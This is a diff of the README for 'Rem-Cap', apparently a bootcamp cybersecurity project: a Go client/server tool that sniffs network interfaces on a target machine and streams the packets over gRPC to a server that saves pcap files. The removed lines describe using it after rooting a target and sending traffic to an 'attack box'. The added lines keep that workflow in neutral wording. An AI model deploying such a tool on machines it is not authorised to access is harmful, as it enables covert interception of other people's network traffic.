@@ -1,44 +1,59 @@
 # Rem-Cap 
 
-Final project for the GA tech Cyber-Security bootcamp
-
 Remotely capture network packets using a client-streaming gRPC API.
 
 ## How it works
 
-The attack box runs the gRPC server.
+The server runs on your box and is responsible for receiving packets and outputting pcaps.
 
-Once the attacker has rooted the target machine, he/she `scp`'s the client binary and the trust certificate over from the attack box.
+The client binary and trust certificate need to be `scp`'d onto the target machine.
 
-The attacker runs the client binary on the target machine specifying : 
+Run the binary and specify :
 
-- which network interfaces he/she would like to packet sniff
-- the amount of time to sniff packets on those interfaces
-- the address and port the attack box is running the gRPC server to stream sniffed packets to
-- the path to the certificate
+- which network interfaces to sniff
+- the amount of time to sniff
+- the address and port of the gRPC server to stream sniffed packets to
+- the path to the trust certificate you scp'd over
 
 The server keeps track of which packets came from which client stream.
 
-server-side logging shows the connection status of any clients and the number of packets captured from that particular connection.
+Server-side logging shows :
 
-client-side logging shows how much time has elapsed out of the total session time as well as how
-many packets have been captured.
+- The connection status of any clients.
+- The number of packets received from any connections.
 
-When a client's session time is up, the connection is closed and a session summary is received from the server.
+Client-side logging shows : 
 
-After the server sends the session summary off, it writes all the captured packets to disk in the form of a pcap file located in `server/pcaps/` .
+- How much time has elapsed out of the total session time specified
+- The number of packets captured from all interfaces so far
 
-The pcap file can then be analyzed in wireshark.
+All logs update in real-time.
+
+When a client's session is over, the connection is closed and a session summary is printed to stdout.
+
+On the server-side, the server writes all captured packets of a closed connection to disk in the form of a pcap and will be found in `server/pcaps/` .
+
+The pcap file can then be analyzed in wireshark or some other pcap analyzing tool.
 
 ## Compiling
 
+`pre-reqs` :  Download [Go](https://golang.org/)
+
+clone this repo
+
+Install dependencies : 
+
+    go get ./...
+
 The creation of certificates, keys, and both remcap binaries ( server and client ) can be automated with the `remcap` target in the Makefile.
+
+The make target requires pw and host args for key and cert generation
 
 ``Example`` :
 
     make remcap pw=test host=localhost
 
-All generated certificates and keys will be saved into a new `ssl/` dir
+All generated certificates and keys will be saved into a new `ssl/` dir.
 
 ## Server Usage
 
@@ -50,8 +65,8 @@ All generated certificates and keys will be saved into a new `ssl/` dir
         --cert          string        Path to signed certificate
     -h, --help                        help for remcap
         --key           string        Path to server private key
-    -o, --out           string        Specify out file
-    -p, --port          string        Port to start Remcap server
+    -o, --out           string        Specify out file name
+    -p, --port          string        Port to start remcap server
 
 
 ## Running Server
@@ -68,21 +83,27 @@ All generated certificates and keys will be saved into a new `ssl/` dir
     help        Help about any command
 
     Flags:
-        --cert      string      Path to trust cert from CA
-    -d, --devices   strings     Network interfaces to sniff
+        --cert      string      Path to trust certificate
+    -d, --devices   strings     Network interfaces to sniff ( comma-separated )
     -h, --help                  Help for remcap
-        --host      string      <ip>:<port> of attack box to stream packets to
+        --host      string      <ip>:<port> of host to stream packets to
         --hours     int         Amount of hours to run capture
     -m, --minutes   int         Amount of minutes to run capture
     -s, --seconds   int         Amount of seconds to run capture
 
 ## Running client :
 
-`Pre-reqs` :
+`What a localhost test would look like` :
 
-- Remote into target machine and escalate to root 
+        ./remcap -s 10 -d en0 --host localhost:4444 --cert ssl/ca.crt 
+
+The above example would sniff the en0 interface for 10 seconds and stream any packets captured to the server running on localhost:4444. The cert is used for the three-way handshake to secure the connection.
+
+`Requirements for executing on a remote target` :
+
+- Root
 - `scp` the client binary ( `remcap` ) and the `ca.crt` file over
 
-then....
+And run the command again, passing the ip and port the gRPC server is running on
 
-        ./remcap -s 10 -d en0 --host ipofattackbox:portofserver --cert /path/to/ca.crt
+        ./remcap -s 10 -d en0 --host <ip>:<port> --cert /path/to/ca.crt 
